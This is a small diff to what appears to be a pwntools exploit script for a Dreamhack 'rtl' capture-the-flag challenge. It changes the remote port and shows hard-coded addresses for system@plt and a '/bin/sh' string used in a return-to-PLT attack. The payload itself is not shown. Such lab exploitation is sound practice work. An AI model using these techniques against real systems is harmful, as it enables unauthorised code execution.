@@ -1,7 +1,7 @@
 from pwn import*
 
 #p = process("./rtl")
-p = remote('host3.dreamhack.games',20675)
+p = remote('host3.dreamhack.games',10514)
 #gdb.attach(p,api=True)
 system_plt = 0x00000000004005d0
 binsh = 0x600874
